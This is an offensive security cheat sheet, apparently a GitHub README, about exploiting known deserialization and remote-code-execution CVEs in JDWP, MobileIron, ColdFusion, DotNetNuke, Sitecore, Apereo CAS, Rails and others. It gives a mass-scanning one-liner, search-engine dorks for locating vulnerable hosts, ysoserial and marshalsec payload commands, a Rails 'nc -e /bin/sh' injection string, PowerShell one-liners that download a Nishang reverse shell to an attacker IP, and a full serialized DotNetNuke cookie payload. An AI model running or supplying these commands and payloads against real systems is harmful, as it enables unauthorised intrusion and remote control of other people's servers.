# pipelines-tricks
Pipelines | Bug Bounty | Hacking | Red Teaming | Blue Teaming | SOC | NOC | Tricks

## Hacking CVE'S



1. **One-line checker : Primefaces, Viewstate insecure deserialization java, coldfusion application endpoints, Telerik Web, 2016 MobileIron vuln insecure deserialization, 2017 MobileIron vuln insecure deserialization, 2018 MobileIron insecure deserialization, JDWP-Handshake insecure deserialization**

```bash
for i in `cat alldir`;do a=$(timeout 3 curl -ks $i |grep -o "javax.faces.resource"|head -n1);b=$(timeout 3 curl -ks $i |grep -o "a4j"|head -n1);c=$( timeout 3 curl -ks $i |grep -o "javax.faces.ViewState"|head -n1);d=$(timeout 3 curl -ks $i |grep -o ".cfm"|head -n1);e=$(timeout 3 curl -ks $i |grep -o "Telerik.Web.UI"|head -n1);f=$(timeout 3 curl -ks $i |grep -o "2016 MobileIron");g=$(timeout 3 curl -ks $i |grep -o "2017 MobileIron");h=$(timeout 3 curl -ks $i |grep -o "2018 MobileIron");ii=$(curl -ks $i |grep -o "JDWP-Handshake"
);echo "$i => $a - $b - $c - $d - $e - $f - $g - $h - $ii" >> domains  & done
```

```bash


```





**JDWP:**

   ```bash
reference: https://ioactive.com/hacking-java-debug-wire-protocol-or-how/
exploit: https://github.com/IOActive/jdwp-shellifier
dorking: https://www.zoomeye.org/searchResult?q=JDWP-HANDSHAKE
title: JDWP-HANDSHAKE


python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'IBM J9 VM - 1.6.0'
[+] Found Runtime class: id=3b9b094e
[+] Found Runtime.getRuntime(): id=a82d26c
[+] Created break event id=1
[+] Waiting for an event on 'java.net.ServerSocket.accept'


COMMAND LINE:

example ipv4 vulnerable to JDWP INJECTION:

python jdwp-shellifier.py -t 127.0.0.1 --break-on "java.lang.String.indexOf" --cmd "ping *.dnslog.cn"**
   ```

**Telerik**
```bash
https://github.com/noperator/CVE-2019-18935 - exploit and information


https://github.com/noperator/CVE-2019-18935
https://github.com/bao7uo/dp_crypto
https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui
https://www.youtube.com/watch?v=eDfGpu3iE4Q
```

**Viewstate**
```bash
https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html - information
exploit:
git clone https://github.com/aludermin/ysoserial-wrapper

use gadgets:
CommonsCollections4 for exploit it and others...


java -jar ysoserial-modified.jar CommonsCollections6 bash "REVERSE SHELL AQ" > payload.sar
cat payload.sar | gzip | base64 -w0

```

**Primefaces**
```bash

entrypoint detected possible vulnerable in code fonte:

press crtl + f and search for: javax.faces.resource

git clone https://github.com/pimps/CVE-2017-1000486

endpoints servlet java: jsf, jsfx, jspx, jsp, faces, seam, htmlx and etc... 
```


**MobileIron**

```bash

"MobileIron User Portal"
inurl:/mifs/
inurl:/mifs/ ext:jsp
git clone https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2020-15505


java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Groovy "/bin/bash" "-c" "nslookup vuln.example.dnslog.cn" > exp.ser
python hessian.py -u 'https://example.com/mifs/.;/services/LogService' -p exp.ser

dorking:
https://www.zoomeye.org/searchResult?q=%22MobileIron%20User%20Portal%3A%20Sign%20In%20%22
others searchs:
hunter.how
shodan.io
criminalip
fofa.info
```


**ColdFusion Exploiting**

```bash

wget https://github.com/codewhitesec/ColdFusionPwn/releases/download/0.0.1/ColdFusionPwn-0.0.1-SNAPSHOT-all.jar

wget https://github.com/frohoff/ysoserial/archive/0.0.5.zip

mv ysoserial-0.0.5.jar ysoserial.jar

exploit:

java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'ping example.burpcollaborator.net' poc.ser



http post https://xyz.domain.tld/flex2gateway/amf Content-Type:application/x-amf < poc.ser



entrypoint: flex2gateway/amf
blank page
dork: ext:.cfm



informations:
https://www.jomar.fr/posts/2020/07/en-exploiting-my-first-rce/


```


**JNDI INjection**
```bash

found in:
CORBA
LDAP
RMI
https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
Java Naming OverView
Directory Interface (JNDI) OverView

JNDI is the Java interface for interacting with Naming and Directory Services that provides a single common interface for interacting with distinct Naming and Directory services such as Remote Method Invocation (RMI), Lightweight Directory Access Protocol (LDAP), Active Directory, Domain Name System (DNS), Common Object Request Broker Architecture (CORBA), etc.
rmi://localhost:1099 (RMI)
ldap://localhost:389 (LDAP)
iiop://localhost:1050 (CORBA)
java applets & servlet java
https://www.softwaretalks.io/v/2957/a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
```


**Ruby Rails**
```bash
?system('nc+-e+/bin/sh+#{127.0.0.1}+#{9005}')%3ba%23
https://github.com/h4ms1k/CVE-2020-8163/blob/master/exploit.rb
https://github.com/sh286/CVE-2020-8163/blob/master/exploit.rb
https://packetstormsecurity.com/files/158604/Ruby-On-Rails-5.0.1-Remote-Code-Execution.html
CVE-2020-8163
```

**DotNetNuke**
```bash
https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/

dorking:
https://publicwww.com/websites/%22dnn.js%22/
inurl:dnn.js

inurl:dnn.modalpopup.js

inurl:dnn.servicesframework.js

inurl:dnn.xml.js

inurl:dnncore.js

inurl:/Portals/0/

inurl:/DesktopModules/

inurl:/DNNCorp/

inurl:/DotNetNuke

inurl:/tabid/*/Default.aspx

inurl:/tabid/*/language/*/Default.aspx

intext:"by DNN Corp "


report hackerone: https://hackerone.com/reports/876708

POC: https://www.youtube.com/watch?v=xwx9CFyCZVc
NSA.GOV: https://apps.nsa.gov/iaarchive/library/ia-advisories-alerts/dotnetnuke-remote-code-execution-vulnerability-cve2-2017-9822.cfm
DotNetNuke Payloads:
https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4

Proof of Concept (PoC) 2: Aggressive Mode (exploit with powershell reverse tcp shell)

On local machine, listen any port that you don't use

$ nc -nlvp 7575

Generate payload using YSoSerial.net with DotNetNuke plugin

PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575"


https://github.com/murataydemir/CVE-2017-9822


msfconsole:

mv 48336.rb /usr/share/metasploit-framework/modules/exploits/windows/custom/ 
cd /usr/share/metasploit-framework/modules/exploits/windows/custom/
msfconsole
use exploit/windows/custom/48336
set rhosts ip-alvo
set targeturi /8.0.4/test 
set uripath /8.0.4 
check




https://www.youtube.com/watch?v=xwx9CFyCZVc - DotNetNuke 8.0.4 (CVE-2017-9822)


https://www.youtube.com/watch?v=rMgO7G4tU_4 - DotNetNuke v. 9.2.0 - 9.2.1


https://www.youtube.com/watch?v=C33jx5Yi8HU - DotNetNuke v. 9.2.2 - 9.3.0-RC



.\ysoserial.exe -p DotNetNuke -M run_command -C  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.13.37 -Port 1337"


https://glitchwitch.io/blog/2019-05/exploiting-dnn-rce/

CVE-2018-15811
CVE-2018-15812
CVE-2018-18325
CVE-2018-18326.



dotnetnuke
inscure deserialization vulnerability in .net servers
you need to update the cookies to put a header in the cookie directive called dnnpersonalize=
https://glitchwitch.io/blog/2019-05/exploiting-dnn-rce/
.\ysoserial.exe -p DotNetNuke -M run_command -C  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.13.37 -Port 1337"

Cookie: dnn_IsMobile=False;DNNPersonalization=<profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////SSBmb3Jnb3QgdG8gc2F2ZSB0aGUgcGF5bG9hZCB3aGVuIEkgd3JvdGUgdGhpcyBibG9nIHBvc3QgYW5kIHdhcyB0b28gYnVzeSB0byBzcGluIHVwIGEgbmV3IHdpbmRvd3MvZG5uIHZt=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>;language=en-US; .ASPXANONYMOUS=AdJ_92Sn1AEkAAAAODU5YjVjZWMtOWMwYS00ZmE1LThkODgtNWI2OTA0NjZjZjcz0; DotNetNukeAnonymous=b8bcc886-3286-4c26-8a9a-b6d3a73c6376; __RequestVerificationToken=JXPAgO5sl6NtPas-NgSv6SDSQgqLV8eAIlRa0ihpoSVyw_MSzjHXsgJhmQSV-mfU7IZOqjDfBz-fhJ81upD024MEoJ2UKG_QjTSYW_tVkAzOad9tOaWjzfm2c1o1

As you can see there is a header in the cookie directive called: DNNPersonalization=
it has the serialized payload


```





**SITECORE Exploiting**

```bash

git clone https://github.com/ItsIgnacioPortal/CVE-2021-42237
cd CVE-2021-42237

cat CVE-2021-42337.xml |sed 's\ CMD-COMMAND-HERE\ nslookup yourdns.interach.sh\g'  >> new.xml


curl -i -X POST HOST-HERE/sitecore/shell/ClientBin/Reporting/Report.ashx \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept: */*" \
  -H "Accept-Language: en" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" \
  -H "Connection: close" \
  -H "Content-Type: text/xml" \
  -H "Content-Length: CONTENTLENGTH-HERE" \
  --data-binary "@new.xml"


##############


CVE-2023-35813 for sitecore

git clone https://github.com/lexy-1/CVE-2023-35813

go run CVE-2023-35813.go https://example.com
or
go build CVE-2023-35813.go
./CVE-2023-35813 https://example.com


dump credetials

```



**ApereoCAS insecure deserialization**

```bash
CAS insecure deserialization
dork: inurl:/cas/login
https://github.com/vulhub/vulhub/tree/master/apereo-cas/4.1-rce
command:  java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "nslookup example.dnslog.cn"
wget https://github.com/vulhub/Apereo-CAS-Attack/releases/download/v1.0.0/apereo-cas-attack-1.0-SNAPSHOT-all.jar
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

mv ysoserial-master-SNAPSHOT.jar  ysoserial-master-30099844c6-1.jar

mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=ysoserial-master-30099844c6-1.jar -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.6 -Dpackaging=jar -DlocalRepositoryPath=my-repo


java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections6 "nslookup example.interact.sh"


change parameter: execution=serealized-code-here


auto exploit and changing gadgets automatic =)
https://github.com/lexy-1/ApereoCas-Exploit


```


**Insecure Deserialization __ViewState .net**

```bash

https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
insecure deserialization
.net
entrypoint
___viewstate

https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/ - informations.

```



**Richfaces Exploit**

```bash
https://github.com/redtimmy/Richsploit
java -jar Richsploit.jar -e 3  -p ./payload.sar -v 3 -u https://www.example.com/example/a4j/s/3_3_3.Final


code fonte and press crtl + f and search:
entrypoint possible vulnerable: /a4j/s/


```




**Others papers, articles and informations:**

```bash

https://www.silentrobots.com/blog/2016/10/02/exploiting-cve-2016-4264-with-oxml-xxe/
https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/
https://labs.bishopfox.com/tech-blog/gadgetprobe
https://xerosecurity.com/wordpress/exploiting-php-serialization-object-injection-vulnerabilities/
https://exitno.de/webhacking/
https://blog.chaitin.cn/gopher-attack-surfaces/

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md
https://attack.mitre.org/techniques/T1003/
http://blog.pi3.com.pl/
http://uninformed.org/index.cgi?v=all
https://vx-underground.org/papers
https://cs.piosky.fr/post-exploit/windows/lateral_movements/




Win-LPE:
https://github.com/zcgonvh/EfsPotato
https://github.com/KaLendsi/CVE-2021-34486
https://github.com/ollypwn/CallbackHell
https://github.com/learner-ing/redis-rce
https://github.com/klinix5/InstallerFileTakeOver
https://github.com/M-ensimag/CVE-2019-18276
https://github.com/gfoss/CVE-2021-43326_Exploit

```
